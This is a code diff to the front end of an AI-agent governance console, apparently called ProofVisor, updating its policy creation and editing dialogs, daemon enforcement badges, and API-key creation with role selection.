-      hint: "Stop SSNs and card numbers leaving via the LLM",
+      hint: "Document the PII rule your daemon's local guard enforces",
       kind: "guardrail",
       scope: "llm.egress",
       param: null,
       build: function () {
         return {
           name: "privacy.pii_egress",
-          description: "Block LLM responses that contain SSNs or payment card numbers.",
+          description: "Block LLM responses that contain SSNs or payment card numbers (documentation of the local guard; daemons attribute hits to this name).",
           body: [
             'policy "privacy.pii_egress" {',
             "  applies_to = llm.egress",
@@ -3645,6 +3989,15 @@
     },
   ];
 
+  // Human summary of how daemons treat a policy of this kind.
+  function kindNote(kind) {
+    var info = POLICY_KIND_INFO[kind];
+    if (!info) return "";
+    return info.enforceable
+      ? "Daemons that pull policies (set up on each deployment's page) enforce this spec on top of their local config. A pushed policy can only tighten the host's own limits, never loosen them."
+      : "Not enforceable by daemons (" + kind + "): this entry documents the rule and attributes the daemon's own guard hits to its name.";
+  }
+
   function openCreatePolicyModal() {
     if (document.body.classList.contains("locked")) return;
     var chips = POLICY_TEMPLATES.map(function (t, i) {
@@ -3655,12 +4008,17 @@
       '<div class="modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="polTitle">' +
         '<div class="modal modal-wide">' +
           '<h2 id="polTitle">New policy</h2>' +
-          '<p class="sub">Start from a template — the rule writes itself and enforces on the next tool call. You can refine it any time.</p>' +
+          '<p class="sub">Start from a template — the spec writes itself and every daemon that pulls policies enforces it on its next sync. You can refine it any time.</p>' +
           '<form id="polForm">' +
             '<div class="tpl-row" role="radiogroup" aria-label="Policy template">' + chips + "</div>" +
             '<div class="field" id="polParamField"></div>' +
-            '<div class="field"><label for="polPreview">Definition (generated)</label>' +
+            '<div class="spec-grid">' +
+              '<div class="field"><label for="polName">Name</label><input id="polName" type="text" required maxlength="80" /></div>' +
+              '<div class="field"><label for="polScope">Scope</label><input id="polScope" type="text" required maxlength="120" /><div style="color:var(--fg-3); font-size:11.5px; margin-top:4px">tool.* / tool.&lt;name&gt; for tool rules, llm.request for model traffic</div></div>' +
+            "</div>" +
+            '<div class="field"><label for="polPreview">Definition (generated) <span id="polKindNote" style="font-weight:400; color:var(--fg-3)"></span></label>' +
               '<pre class="policy-body policy-preview" id="polPreview" tabindex="0" aria-live="polite"></pre></div>' +
+            '<p id="pol_err" style="display:none;color:var(--danger, #e5484d);font-size:12.5px;margin:0 0 8px"></p>' +
             '<div class="actions"><button type="button" class="btn" data-close>Cancel</button><button class="btn accent" type="submit">Create &amp; enable</button></div>' +
           "</form>" +
         "</div>" +
@@ -3680,6 +4038,7 @@
       if (e.target === backdrop || e.target.hasAttribute("data-close")) close();
     });
 
+    var nameTouched = false;
     function currentTemplate() {
       var v = backdrop.querySelector('input[name="polTpl"]:checked').value;
       return POLICY_TEMPLATES.find(function (t) { return t.id === v; });
@@ -3698,40 +4057,65 @@
         ' value="' + esc(t.param.value) + '" required />';
       f.querySelector("#polParam").addEventListener("input", refresh);
     }
-    function refresh() {
+    function built() {
       var t = currentTemplate();
-      var built = t.build(paramValue());
-      backdrop.querySelector("#polPreview").innerHTML = syntaxPolicy(built.body);
+      var b = t.build(paramValue());
+      return { template: t, name: b.name, description: b.description, body: b.spec ? specBodyText(b.spec) : (b.body || "") };
+    }
+    function refresh() {
+      var b = built();
+      backdrop.querySelector("#polPreview").innerHTML = syntaxPolicy(b.body);
+      backdrop.querySelector("#polKindNote").textContent = "· " + (POLICY_KIND_INFO[b.template.kind] ? POLICY_KIND_INFO[b.template.kind].label : b.template.kind) + (kindEnforceable(b.template.kind) ? "" : " — not enforceable by daemons");
+      // A generated value is not an edit: set it as the field's default
+      // too, so the unsaved-changes guard only fires for what the user
+      // typed or picked (otherwise the first Escape on a fresh dialog
+      // only shows the "unsaved changes" toast and keeps it open).
+      if (!nameTouched) setGenerated(backdrop.querySelector("#polName"), b.name);
+    }
+    function setGenerated(input, value) {
+      input.value = value;
+      input.defaultValue = value;
+    }
+    function resetScope() {
+      setGenerated(backdrop.querySelector("#polScope"), currentTemplate().scope);
     }
     $$('input[name="polTpl"]', backdrop).forEach(function (r) {
-      r.addEventListener("change", function () { renderParam(currentTemplate()); refresh(); });
+      r.addEventListener("change", function () { nameTouched = false; renderParam(currentTemplate()); resetScope(); refresh(); });
     });
+    backdrop.querySelector("#polName").addEventListener("input", function () { nameTouched = true; });
     renderParam(currentTemplate());
+    resetScope();
     refresh();
 
     backdrop.querySelector("#polForm").addEventListener("submit", function (e) {
       e.preventDefault();
+      var errEl = backdrop.querySelector("#pol_err");
+      errEl.style.display = "none";
+      var b = built();
+      var name = backdrop.querySelector("#polName").value.trim();
+      var scope = backdrop.querySelector("#polScope").value.trim();
+      if (!name) { errEl.textContent = "Name can't be empty."; errEl.style.display = "block"; return; }
+      if (!scope) { errEl.textContent = "Scope can't be empty."; errEl.style.display = "block"; return; }
+      // Same validation the server runs, before the request leaves.
+      var v = validateSpec(b.template.kind, scope, b.body);
+      if (!v.ok) { errEl.textContent = v.detail; errEl.style.display = "block"; return; }
       var btn = e.target.querySelector('button[type="submit"]');
       btn.disabled = true;
-      var t = currentTemplate();
-      var built = t.build(paramValue());
       state.ds.createPolicy({
-        name: built.name, kind: t.kind, scope: t.scope,
-        description: built.description, body: built.body,
+        name: name, kind: b.template.kind, scope: scope,
+        description: b.description, body: b.body,
       }).then(function (p) {
         close();
-        // Server-side policy CRUD persists to the org (POST
-        // /api/v1/policies — R232 F3 resolved); what is NOT wired yet
-        // is daemon-side enforcement sync — the daemon still enforces
-        // its local policy files. Keep that distinction honest.
-        var enforcedMsg = state.ds.mode === "mock"
-          ? "Policy created and enforcing — the daemon picks it up on its next sync."
-          : "Policy saved to your org. Note: daemons enforce their local policy files — auto-sync from the console is not wired yet.";
-        toastLink(enforcedMsg, "#/policies/" + p.id, "View policy →");
+        var msg = kindEnforceable(p.kind)
+          ? "Policy created. Daemons that pull policies pick it up on their next sync (see a deployment's page to set this up)."
+          : "Policy saved. " + p.kind + " policies document intent — daemons do not enforce them.";
+        toastLink(msg, "#/policies/" + p.id, "View policy →");
         navigate("#/policies/" + p.id);
       }).catch(function (err) {
         btn.disabled = false;
-        toast(err.message || "Create failed", true);
+        var msg = (err && err.data && err.data.specError) || (err && err.message) || "Create failed";
+        if (err && err.errorCode === "policy_name_in_use") msg = "Another policy already has that name.";
+        errEl.textContent = msg; errEl.style.display = "block";
       });
     });
   }
@@ -3745,6 +4129,35 @@
     if (e.target.closest("#addDep, #addDep2")) openCreateDeploymentModal();
   });
 
+  // Enforcement badge: how many of the org's daemons run the bundle
+  // that contains this policy. `deps` (listDeployments) names the
+  // stale ones; the counts come from the policy's `enforcement`.
+  function policyEnforcementBadge(p, deps) {
+    if (!kindEnforceable(p.kind) || p.enforceable === false) {
+      return '<span class="pill neutral enf" title="Daemons cannot enforce ' + esc(p.kind) + ' policies; this entry documents the rule and attributes hits.">Not enforceable by daemons (' + esc(p.kind) + ")</span>";
+    }
+    var e = p.enforcement || { deployments: 0, applied: 0, stale: 0, unsupported: 0 };
+    if (!p.enabled) return '<span class="pill neutral enf" title="Disabled policies are left out of the bundle daemons pull.">Disabled — not in the bundle</span>';
+    if (!e.deployments) return '<span class="pill neutral enf" title="Register a deployment; its page shows how to start pulling policies.">No daemons yet</span>';
+    var staleNames = (deps || []).filter(function (d) { return !d.isDemo && d.policyBundle && d.policyBundle.stale; }).map(function (d) { return d.name; });
+    // `applied` counts the daemons that enforce THIS policy; `current`
+    // counts every daemon on the current bundle, so the ones that
+    // pulled it but refused this policy are not reported as "never".
+    var current = typeof e.current === "number" ? e.current : e.applied;
+    var never = e.deployments - current - e.stale;
+    var cls = e.applied === e.deployments ? "ok" : (e.applied > 0 ? "warn" : "neutral");
+    var html = '<span class="pill ' + cls + ' enf" title="' + esc(never > 0 ? never + " daemon" + (never === 1 ? " has" : "s have") + " not pulled a bundle yet (each deployment's page shows how to turn pulling on)" : "Every daemon runs the current bundle") + '">' +
+      esc("Enforced by " + e.applied + " of " + e.deployments + " daemon" + (e.deployments === 1 ? "" : "s")) + "</span>";
+    if (e.stale > 0) {
+      var staleLabel = staleNames.length === 1
+        ? "Daemon '" + staleNames[0] + "' has an older bundle"
+        : (staleNames.length || e.stale) + " daemons have an older bundle";
+      html += ' <span class="pill warn enf" title="They pick the current bundle up on their next console-sync pass.">' + esc(staleLabel) + "</span>";
+    }
+    if (e.unsupported > 0) html += ' <span class="pill err enf">' + e.unsupported + " daemon" + (e.unsupported === 1 ? " reports" : "s report") + " it unsupported</span>";
+    return html;
+  }
+
   async function renderPolicies(main) {
     rememberListUrl("policies");
     // Same client-side role gate as SETTINGS_TABS (R90 F3): the API
@@ -3753,14 +4166,17 @@
     var polRole = (state.session && state.session.org && state.session.org.role) || "member";
     var polCanWrite = polRole !== "member";
     var addPolBtn = polCanWrite ? '<button class="btn accent" id="addPol">+ New policy</button>' : "";
-    main.innerHTML = pageHeader("Policies", "Rules the daemon enforces before any tool call or LLM egress.", addPolBtn) + loadingBlock("table");
-    var pols;
-    try { pols = await state.ds.listPolicies(); } catch (e) { return renderError(main, e); }
+    main.innerHTML = pageHeader("Policies", "Rules your daemons pull and enforce before any tool call or LLM egress.", addPolBtn) + loadingBlock("table");
+    var pols, deps = [];
+    try {
+      pols = await state.ds.listPolicies();
+      try { deps = await state.ds.listDeployments(); } catch (e) { deps = []; }
+    } catch (e) { return renderError(main, e); }
     if (!pols.length) {
       main.innerHTML = pageHeader("Policies", "0 policies · none enabled", addPolBtn) +
         (polCanWrite
-          ? emptyState("No policies yet", "Write your first policy to start blocking risky prompts, tool calls, or PII egress. The daemon evaluates policies before any request reaches your model.", "+ Write a policy", null, "addPolCta")
-          : emptyState("No policies yet", "An owner or admin can write policies that block risky prompts, tool calls, or PII egress before any request reaches your model.", null, null, null));
+          ? emptyState("No policies yet", "Write your first policy to start blocking risky tool calls, runaway spend, or off-list vendors. Daemons pull the enabled policies as one bundle and enforce them before any request reaches your model.", "+ Write a policy", null, "addPolCta")
+          : emptyState("No policies yet", "An owner or admin can write policies that block risky tool calls, runaway spend, or off-list vendors before any request reaches your model.", null, null, null));
       // #addPol / #addPolCta are handled by the delegated listener above.
       return;
     }
@@ -3771,16 +4187,21 @@
         : '<span class="pill ' + (p.enabled ? "ok" : "neutral") + '">' + (p.enabled ? "on" : "off") + "</span>";
       return '<tr data-clickable data-id="' + esc(p.id) + '" data-nav="#/policies/" tabindex="0">' +
         '<td class="policy-row"><div class="name">' + esc(p.name) + '</div><div class="kind">' + esc(p.kind) + " · " + esc(p.scope) + "</div></td>" +
-        '<td title="' + esc(p.description) + '">' + esc(p.description) + "</td>" +
+        '<td title="' + esc(p.description) + '">' + esc(p.description) + '<div class="enf-row">' + policyEnforcementBadge(p, deps) + "</div></td>" +
         '<td class="num tabular">' + esc(p.hits24h) + "</td>" +
         '<td class="num tabular">' + (p.blocks24h > 0 ? '<span style="color: var(--danger-solid); font-weight:500">' + esc(p.blocks24h) + "</span>" : esc(p.blocks24h)) + "</td>" +
         '<td style="color:var(--fg-2)">' + timeAgoCell(p.updatedAt) + "</td>" +
         "<td>" + switchCell + "</td>" +
         "</tr>";
     }).join("");
-    main.innerHTML = pageHeader("Policies", pols.length + " policies · " + pols.filter(function (p) { return p.enabled; }).length + " enabled", addPolBtn) +
+    var realDeps = deps.filter(function (d) { return !d.isDemo; });
+    var pulling = realDeps.filter(function (d) { return d.policyBundle; }).length;
+    var fleetNote = realDeps.length
+      ? " · " + pulling + " of " + realDeps.length + " daemon" + (realDeps.length === 1 ? "" : "s") + " pulling the bundle"
+      : "";
+    main.innerHTML = pageHeader("Policies", pols.length + " policies · " + pols.filter(function (p) { return p.enabled; }).length + " enabled" + fleetNote, addPolBtn) +
       '<div class="card" style="padding:0"><div class="table-wrap"><table>' +
-        "<thead><tr><th>Policy</th><th>Description</th><th class=\"num\">Hits 24h</th><th class=\"num\">Blocks</th><th>Updated</th><th class=\"act-1\"><span class=\"sr-only\">Actions</span></th></tr></thead>" +
+        "<thead><tr><th>Policy</th><th>Description &amp; enforcement</th><th class=\"num\">Hits 24h</th><th class=\"num\">Blocks</th><th>Updated</th><th class=\"act-1\"><span class=\"sr-only\">Actions</span></th></tr></thead>" +
         "<tbody>" + rows + "</tbody></table></div></div>";
     var tbody = main.querySelector("tbody");
     tbody.addEventListener("click", function (e) {
@@ -3808,14 +4229,21 @@
 
   async function renderPolicyDetail(main, id) {
     main.innerHTML = pageHeader("Policy", "", '<a href="' + esc(backToListUrl("policies")) + '" class="btn">← All policies</a>') + loadingBlock("stats");
-    var p, fired = [];
+    var p, fired = [], deps = [];
     try { p = await state.ds.getPolicy(id); } catch (e) { return renderError(main, e); }
+    try { deps = await state.ds.listDeployments(); } catch (e) { deps = []; }
     // Close the loop policy → session → receipt: list the sessions
     // this policy actually fired on, so "plain rules" lead straight
     // to the evidence.
     try {
       var resp = await state.ds.listSessions({ limit: 100 });
-      fired = (resp.sessions || []).filter(function (s) { return (s.policiesFired || []).indexOf(id) >= 0; });
+      // Mock sessions carry policy ids; live sessions carry the policy
+      // names the daemon attributed to their events (Event.policyName),
+      // which is what the server matches against Policy.name.
+      fired = (resp.sessions || []).filter(function (s) {
+        var list = s.policiesFired || [];
+        return list.indexOf(id) >= 0 || (p.name && list.indexOf(p.name) >= 0);
+      });
     } catch (e) { /* the policy page still renders without the list */ }
     // Keep the headline consistent with the evidence below it: when we
     // have the fired-session list, derive the block count from it
@@ -3828,20 +4256,32 @@
     // 403 (same gate as the list page + SETTINGS_TABS R90 F3).
     var polDetailRole = (state.session && state.session.org && state.session.org.role) || "member";
     var headerSwitch = polDetailRole !== "member"
-      ? ' <button class="btn" id="polEditBtn" title="Edit the name, description, or rule body">Edit</button>' +
+      ? ' <button class="btn" id="polEditBtn" title="Edit the name, description, scope or spec">Edit</button>' +
         ' <button class="btn danger" id="polDeleteBtn" title="Delete this policy — its hit history goes with it">Delete</button>' +
         ' <button class="switch ' + switchCls + '" id="polSwitch" title="Toggle enabled" aria-label="Toggle policy enabled" role="switch" aria-checked="' + (p.enabled ? "true" : "false") + '"></button>'
       : "";
+    var enforceable = kindEnforceable(p.kind) && p.enforceable !== false;
+    var spec = parseSpec(p);
+    var e = p.enforcement || { deployments: 0, applied: 0, stale: 0, unsupported: 0 };
     main.innerHTML =
       pageHeader(p.name, p.kind + " · " + p.scope, '<a href="' + esc(backToListUrl("policies")) + '" class="btn">← All policies</a>' + headerSwitch) +
       '<div class="dep-summary">' +
         depCell("Status", p.enabled ? '<span class="pill ok status-dot">enabled</span>' : '<span class="pill neutral">disabled</span>', false, true) +
+        depCell("Enforcement", policyEnforcementBadge(p, deps), false, true) +
         depCell("Hits (24h)", p.hits24h.toLocaleString()) +
-        depCell("Blocks (24h)", blocks24 > 0 ? '<span style="color: var(--danger-solid)">' + blocks24 + "</span>" : blocks24, false, true) +
+        depCell("Blocks (24h)", blocks24 > 0 ? '<span style="color: var(--danger-solid)">' + esc(blocks24) + "</span>" : esc(blocks24), false, true) +
         depCell("Updated", timeAgoCell(p.updatedAt), false, true) +
       "</div>" +
       '<div class="card"><h2>Description</h2><p style="margin:0;color:var(--fg-2);font-size:var(--t-body)">' + esc(p.description) + '</p></div>' +
-      '<div class="card" style="margin-top:12px"><h2>Definition</h2><pre class="policy-body">' + syntaxPolicy(p.body) + "</pre></div>" +
+      '<div class="card" style="margin-top:12px"><h2>' + (enforceable ? "Spec daemons enforce" : "Definition") + '</h2>' +
+        '<p style="margin:0 0 10px;color:var(--fg-2);font-size:var(--t-sec)">' + esc(kindNote(p.kind)) +
+        (enforceable && !spec ? " This body is not a valid " + esc(p.kind) + " spec — edit it so daemons can apply it." : "") + "</p>" +
+        '<pre class="policy-body">' + syntaxPolicy(spec ? specBodyText(spec) : p.body) + "</pre>" +
+        (enforceable && e.deployments
+          ? '<p style="margin:10px 0 0;color:var(--fg-3);font-size:11.5px">Bundle status per daemon: ' +
+            deps.filter(function (d) { return !d.isDemo; }).map(function (d) { return '<a href="#/deployments/' + esc(d.id) + '">' + esc(d.name) + "</a> " + bundlePill(d); }).join(" · ") + "</p>"
+          : "") +
+      "</div>" +
       (fired.length
         ? '<div class="card" style="margin-top:12px; padding:0">' +
             '<div style="padding:12px 16px; border-bottom: 1px solid var(--border); display:flex; align-items:baseline; gap:8px;">' +
@@ -3867,7 +4307,7 @@
     on("#polDeleteBtn", "click", function () {
       confirmModal({
         title: "Delete this policy?",
-        body: 'The rule "' + p.name + '" stops being distributed to daemons on their next sync, and its hit history disappears with it. Prefer the toggle if you just want it off for a while.',
+        body: 'The rule "' + p.name + '" leaves the bundle daemons pull on their next sync, and its hit history disappears with it. Prefer the toggle if you just want it off for a while.',
         confirmLabel: "Delete policy",
         danger: true,
         onConfirm: function () {
@@ -3889,14 +4329,22 @@
   // sessions-fired history that hang off the policy id).
   function openEditPolicyModal(p, onSaved) {
     if (document.body.classList.contains("locked")) return;
+    var enforceable = kindEnforceable(p.kind);
+    var spec = parseSpec(p) || {};
     var backdrop = h(
       '<div class="modal-backdrop" role="dialog" aria-modal="true"><div class="modal modal-wide">' +
         "<h2>Edit policy</h2>" +
-        '<p class="sub">Changes apply on the daemon\'s next policy sync. The policy ID and its hit history stay put.</p>' +
+        '<p class="sub">' + (enforceable ? "Changes reach every daemon on its next policy pull. The policy ID and its hit history stay put." : "This " + esc(p.kind) + " policy is documentation: daemons do not enforce it, but hits they attribute to its name keep counting here.") + "</p>" +
         '<form id="peForm">' +
-          '<div class="field"><label for="pe_name">Name</label><input id="pe_name" type="text" required maxlength="80" value="' + esc(p.name) + '"></div>' +
+          '<div class="spec-grid">' +
+            '<div class="field"><label for="pe_name">Name</label><input id="pe_name" type="text" required maxlength="80" value="' + esc(p.name) + '"></div>' +
+            '<div class="field"><label for="pe_scope">Scope</label><input id="pe_scope" type="text" required maxlength="120" value="' + esc(p.scope || "") + '"></div>' +
+          "</div>" +
           '<div class="field"><label for="pe_desc">Description</label><input id="pe_desc" type="text" maxlength="500" value="' + esc(p.description || "") + '"></div>' +
-          '<div class="field"><label for="pe_body">Definition</label><textarea id="pe_body" rows="8" spellcheck="false" style="font-family:var(--mono, ui-monospace, monospace);font-size:12.5px" maxlength="16384">' + esc(p.body || "") + '</textarea></div>' +
+          (enforceable
+            ? '<div id="pe_spec">' + specFields(p.kind, spec) + "</div>" +
+              '<div class="field"><label>Spec daemons will receive</label><pre class="policy-body policy-preview" id="pe_preview" aria-live="polite"></pre></div>'
+            : '<div class="field"><label for="pe_body">Definition</label><textarea id="pe_body" rows="8" spellcheck="false" style="font-family:var(--mono, ui-monospace, monospace);font-size:12.5px" maxlength="16384">' + esc(p.body || "") + "</textarea></div>") +
           '<p id="pe_err" style="display:none;color:var(--danger, #e5484d);font-size:12.5px;margin:0 0 8px"></p>' +
           '<div class="actions"><button type="button" class="btn" data-close>Cancel</button><button type="submit" class="btn accent">Save changes</button></div>' +
         "</form>" +
@@ -3913,6 +4361,22 @@
       if (handled) return;
       if (e.target === backdrop || e.target.hasAttribute("data-close")) close();
     });
+    function currentBody() {
+      if (!enforceable) return { body: backdrop.querySelector("#pe_body").value };
+      var r = readSpecFields(p.kind, backdrop);
+      if (r.error) return { error: r.error };
+      return { body: specBodyText(r.spec) };
+    }
+    function refreshPreview() {
+      if (!enforceable) return;
+      var cur = currentBody();
+      var pre = backdrop.querySelector("#pe_preview");
+      pre.innerHTML = cur.error ? '<span style="color:var(--danger, #e5484d)">' + esc(cur.error) + "</span>" : syntaxPolicy(cur.body);
+    }
+    if (enforceable) {
+      $$("#pe_spec input, #pe_spec textarea", backdrop).forEach(function (el) { el.addEventListener("input", refreshPreview); });
+      refreshPreview();
+    }
     backdrop.querySelector("#peForm").addEventListener("submit", async function (e) {
       e.preventDefault();
       if (handled) return;
@@ -3920,11 +4384,19 @@
       errEl.style.display = "none";
       var fields = {};
       var name = backdrop.querySelector("#pe_name").value.trim();
+      var scope = backdrop.querySelector("#pe_scope").value.trim();
       var desc = backdrop.querySelector("#pe_desc").value;
-      var bodyText = backdrop.querySelector("#pe_body").value;
       if (!name) { errEl.textContent = "Name can't be empty."; errEl.style.display = "block"; return; }
+      if (!scope) { errEl.textContent = "Scope can't be empty."; errEl.style.display = "block"; return; }
+      var cur = currentBody();
+      if (cur.error) { errEl.textContent = cur.error; errEl.style.display = "block"; return; }
+      var bodyText = cur.body;
       if (!bodyText.trim()) { errEl.textContent = "The definition can't be empty — disable the policy instead if you want it off."; errEl.style.display = "block"; return; }
+      // Same validation the server runs, before the request leaves.
+      var v = validateSpec(p.kind, scope, bodyText);
+      if (!v.ok) { errEl.textContent = v.detail; errEl.style.display = "block"; return; }
       if (name !== p.name) fields.name = name;
+      if (scope !== (p.scope || "")) fields.scope = scope;
       if (desc !== (p.description || "")) fields.description = desc;
       if (bodyText !== (p.body || "")) fields.body = bodyText;
       if (!Object.keys(fields).length) { close(); toast("No changes"); return; }
@@ -3933,14 +4405,14 @@
       try {
         await state.ds.updatePolicy(p.id, fields);
         close();
-        toast("Policy updated — daemons pick it up on their next sync");
+        toast(enforceable ? "Policy updated — daemons pick it up on their next pull" : "Policy updated");
         if (onSaved) onSaved();
       } catch (e2) {
         btn.disabled = false;
-        var msg = e2.message || "Save failed";
+        var msg = (e2.data && e2.data.specError) || e2.message || "Save failed";
         if (e2.errorCode === "policy_name_in_use" || msg === "policy_name_in_use") msg = "Another policy already has that name.";
         else if (e2.status === 403) msg = "Members can't edit policies — ask an owner or admin.";
-        else if (e2.errorCode === "invalid_input" || msg === "invalid_input") msg = "Name must be 1-80 characters; definition up to 16 KB.";
+        else if (!(e2.data && e2.data.specError) && (e2.errorCode === "invalid_input" || msg === "invalid_input")) msg = "Name must be 1-80 characters; definition up to 16 KB.";
         errEl.textContent = msg;
         errEl.style.display = "block";
       }
@@ -4288,7 +4760,7 @@
             var blob = await state.ds.exportMyData(password);
             var a = document.createElement("a");
             a.href = URL.createObjectURL(blob);
-            a.download = "agentvisor-export-" + new Date().toISOString().slice(0, 10) + ".jsonl";
+            a.download = "proofvisor-export-" + new Date().toISOString().slice(0, 10) + ".jsonl";
             document.body.appendChild(a); a.click(); a.remove();
             setTimeout(function () { URL.revokeObjectURL(a.href); }, 4000);
             toast("Export downloaded");
@@ -4332,7 +4804,7 @@
               render();
               return;
             }
-            try { localStorage.setItem("av_signed_out_at", String(Date.now())); } catch (e3) {}
+            try { localStorage.setItem("pv_signed_out_at", String(Date.now())); } catch (e3) {}
             state.session = null;
             toast("Organization deleted. Goodbye.");
             navigate("#/login");
@@ -4739,11 +5211,11 @@
           '</select>';
       }
       return '<tr data-user="' + esc(m.userId || m.id) + '">' +
-        '<td><div class="actor"><span class="av">' + esc(initials(m.displayName || m.email)) + '</span><div><div style="font-weight:500">' + esc(m.displayName || m.email) +
+        '<td><div class="actor"><span class="pv">' + esc(initials(m.displayName || m.email)) + '</span><div><div style="font-weight:500">' + esc(m.displayName || m.email) +
           (m.mfaEnrolled ? ' <span class="pill neutral" title="This account requires a passkey on every sign-in">2FA</span>' : '') +
           '</div><div class="id">' + esc(m.email) + '</div></div></div></td>' +
         '<td>' + selector + '</td>' +
-        '<td style="color:var(--fg-2)">' + timeAgoCell(m.lastActive) + '</td>' +
+        '<td style="color:var(--fg-2)">' + timeAgoCell(m.joinedAt) + '</td>' +
         '<td style="white-space:nowrap">' +
           (canManage && !isSelf && m.mfaEnrolled ? '<button class="btn" data-act="reset-mfa" title="Remove all their passkeys so they can sign in with password alone — for lost or destroyed authenticators">Reset MFA</button> ' : '') +
           (canManage ? '<button class="btn danger" data-act="remove">Remove</button>' : '') +
@@ -4762,7 +5234,7 @@
             : '<span style="margin-left:auto; color:var(--fg-3); font-size:var(--t-sec)">Ask an owner or admin to manage members</span>') +
         "</div>" +
         '<div class="table-wrap"><table>' +
-          '<thead><tr><th>Person</th><th>Role</th><th>Last active</th><th class="act-3"><span class="sr-only">Actions</span></th></tr></thead>' +
+          '<thead><tr><th>Person</th><th>Role</th><th>Joined</th><th class="act-3"><span class="sr-only">Actions</span></th></tr></thead>' +
           '<tbody>' + memberRows + '</tbody>' +
         '</table></div>' +
       '</div>';
@@ -4870,10 +5342,10 @@
       // shape always called renderSettingsMembers(root) after
       // success, so a self-remove:
       //   1. Toast "Member removed"
-      //   2. listMembers() 401 → av-session-expired handler
+      //   2. listMembers() 401 → pv-session-expired handler
       //      fires SECOND toast "Your session expired…"
       //   3. Bounce to /#/login without cross-tab sync (no
-      //      av_signed_out_at write)
+      //      pv_signed_out_at write)
       // Same stacked-toast + no-warning + no-cross-tab-sync
       // anti-pattern R125 F1 just fixed for the passkey-revoke
       // sibling. Mirror that shape here.
@@ -4893,7 +5365,7 @@
               stopLiveStream();
               rolePreview = null;
               state.session = null;
-              try { localStorage.setItem("av_signed_out_at", String(Date.now())); } catch (e) {}
+              try { localStorage.setItem("pv_signed_out_at", String(Date.now())); } catch (e) {}
               toast("You left the workspace. Sign in again to continue.");
               navigate("#/login");
             } else {
@@ -5010,6 +5482,61 @@
     });
     setTimeout(function () { backdrop.querySelector("#inv_email").focus(); }, 20);
   }
+  // Create-key dialog: a name plus the role the key acts with. The
+  // server (routes/api-keys.ts) accepts owner|admin|member, defaults to
+  // admin, and refuses a role above the caller's own, so only roles at
+  // or below the caller's rank are offered. #inpVal keeps the same id
+  // as openInputModal so the browser drills keep working.
+  function openCreateKeyModal(onConfirm) {
+    if (document.body.classList.contains("locked")) return;
+    var myRole = (state.session && state.session.org && state.session.org.role) || "admin";
+    var roles = myRole === "owner" ? ["owner", "admin", "member"] : ["admin", "member"];
+    var backdrop = h(
+      '<div class="modal-backdrop" role="dialog" aria-modal="true"><div class="modal">' +
+        "<h2>Create an API key</h2>" +
+        '<p class="sub">Keys authenticate scripts and CI as this workspace. Pick the least role the job needs: a member key can read sessions and receipts; admin can also manage deployments, policies and webhooks; owner can do everything, including deleting the workspace.</p>' +
+        '<form id="inpForm">' +
+          '<div class="field"><label for="inpVal">Key name</label>' +
+          '<input id="inpVal" type="text" required placeholder="e.g. CI runner" autocomplete="off" /></div>' +
+          '<div class="field"><label for="keyRole">Role</label>' +
+          '<select id="keyRole">' +
+            roles.map(function (r) { return '<option value="' + r + '"' + (r === "admin" ? " selected" : "") + ">" + r + "</option>"; }).join("") +
+          "</select></div>" +
+          '<div class="actions">' +
+            '<button type="button" class="btn" data-close>Cancel</button>' +
+            '<button class="btn accent" type="submit">Create</button>' +
+          "</div>" +
+        "</form>" +
+      "</div></div>"
+    );
+    document.body.appendChild(backdrop);
+    document.body.classList.add("locked");
+    var previouslyFocused = document.activeElement;
+    var uninstall;
+    var handled = false;
+    function close() {
+      if (handled) return;
+      handled = true;
+      backdrop.remove(); document.body.classList.remove("locked");
+      if (uninstall) uninstall();
+      if (previouslyFocused && previouslyFocused.focus) try { previouslyFocused.focus(); } catch (e) {}
+    }
+    uninstall = installModalKeys(backdrop, close);
+    backdrop.addEventListener("click", function (e) {
+      if (handled) return;
+      if (e.target === backdrop || e.target.hasAttribute("data-close")) close();
+    });
+    backdrop.querySelector("#inpForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      if (handled) return;
+      var name = backdrop.querySelector("#inpVal").value.trim();
+      var role = backdrop.querySelector("#keyRole").value;
+      if (!name) return;
+      close();
+      onConfirm(name, role);
+    });
+    setTimeout(function () { var el = backdrop.querySelector("#inpVal"); if (el) el.focus(); }, 20);
+  }
   async function renderSettingsKeys(root) {
     root.innerHTML = '<div class="card">' + loadingBlock("table") + "</div>";
     var keys = [];
@@ -5018,24 +5545,19 @@
     function attachCreate(btn) {
       if (!btn) return;
       btn.addEventListener("click", function () {
-        openInputModal({
-          title: "Create an API key",
-          label: "Key name",
-          placeholder: "e.g. CI runner",
-          confirmLabel: "Create",
-          onConfirm: async function (name) {
-            if (!name || !name.trim()) return;
-            try {
-              var res = await state.ds.createApiKey(name.trim());
-              showTokenModal(res.plaintextToken, "API key created", {
-                subtitle: "Store this API key in your CI runner or automation's secret manager. Send it as the Bearer token in the Authorization header.",
-                notice: "If you lose it, delete this key and create a new one — the plaintext value is never stored on the server, only its argon2 hash.",
-              });
-              await renderSettingsKeys(root);
-            } catch (e) {
-              toast(e && e.message ? e.message : "Could not create key");
-            }
-          },
+        openCreateKeyModal(async function (name, role) {
+          try {
+            var res = await state.ds.createApiKey(name, role);
+            showTokenModal(res.plaintextToken, "API key created", {
+              subtitle: "Store this API key in your CI runner or automation's secret manager. Send it as the Bearer token in the Authorization header. It acts with the " + role + " role.",
+              notice: "If you lose it, delete this key and create a new one — the plaintext value is never stored on the server, only its argon2 hash.",
+            });
+            await renderSettingsKeys(root);
+          } catch (e) {
+            var msg = e && e.message ? e.message : "Could not create key";
+            if (e && e.errorCode === "cannot_grant_role_above_own") msg = "You can't create a key with a role above your own.";
+            toast(msg, true);
+          }
         });
       });
     }
@@ -5047,7 +5569,7 @@
             '<span style="margin-left:8px; color:var(--fg-3); font-size:var(--t-sec)">0 active</span>' +
           "</div>" +
           '<div style="padding: 24px 16px">' +
-          emptyState("No API keys yet", "Create a server-side key to script deployments, rotate ingest tokens, or wire AgentVisor into CI/CD.", "+ Create key", null, "createKeyBtn") +
+          emptyState("No API keys yet", "Create a server-side key to script deployments, rotate ingest tokens, or wire ProofVisor into CI/CD.", "+ Create key", null, "createKeyBtn") +
           "</div></div>";
       attachCreate($("#createKeyBtn", root));
       return;
@@ -5056,6 +5578,7 @@
       return '<tr data-id="' + esc(k.id) + '">' +
         '<td><div style="font-weight:500">' + esc(k.name) + '</div><div class="id">' + esc(k.id) + "</div></td>" +
         '<td class="mono">' + esc(k.hint) + "</td>" +
+        '<td><span class="pill neutral">' + esc(k.role || "admin") + "</span></td>" +
